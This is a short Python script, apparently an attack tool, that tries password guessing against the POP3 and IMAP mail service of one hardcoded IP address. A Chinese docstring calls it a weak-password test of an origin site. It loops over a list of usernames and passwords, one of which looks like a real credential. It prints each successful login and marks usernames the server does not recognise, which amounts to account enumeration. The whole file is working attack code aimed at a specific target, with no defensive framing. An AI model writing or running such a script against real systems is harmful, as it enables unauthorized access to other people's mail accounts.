#!/usr/bin/env python3
"""mail_test.py - 测试源站邮件服务POP3/IMAP弱口令"""
import socket

HOST = '208.87.129.186'

def pop3_login(user, pw):
    try:
        s = socket.create_connection((HOST, 110), timeout=10)
        s.recv(1024)
        s.send(b'USER %s\r\n' % user.encode())
        r1 = s.recv(1024)
        s.send(b'PASS %s\r\n' % pw.encode())
        r2 = s.recv(1024)
        s.close()
        return r1, r2
    except Exception as e:
        return None, str(e)[:50]

def imap_login(user, pw):
    try:
        s = socket.create_connection((HOST, 143), timeout=10)
        s.recv(1024)
        s.send(b'a1 LOGIN %s %s\r\n' % (user.encode(), pw.encode()))
        r = s.recv(1024)
        s.close()
        return r
    except Exception as e:
        return str(e)[:50].encode()

users = ['macro_us1', 'macro', 'admin', 'info', 'support', 'vectorcode', 'omar']
pws = ['JCVQXk7Hre', 'admin', 'password', 'macro123']

print('=== POP3 (110) ===')
for u in users:
    for p in pws:
        r1, r2 = pop3_login(u, p)
        if r1 and b'+OK' in r1 and r2 and b'+OK' in r2:
            print('[成功] POP3 %s/%s' % (u, p))
        elif r1 and b'-ERR' in r1:
            print('[用户不存在] %s' % u)
            break  # 用户名不存在, 换下一个

print('=== IMAP (143) ===')
for u in users[:4]:
    for p in pws[:2]:
        r = imap_login(u, p)
        if b'OK' in r and b'LOGIN' in r:
            print('[成功] IMAP %s/%s' % (u, p))
        elif b'NO' in r:
            print('[失败] IMAP %s/%s' % (u, p))
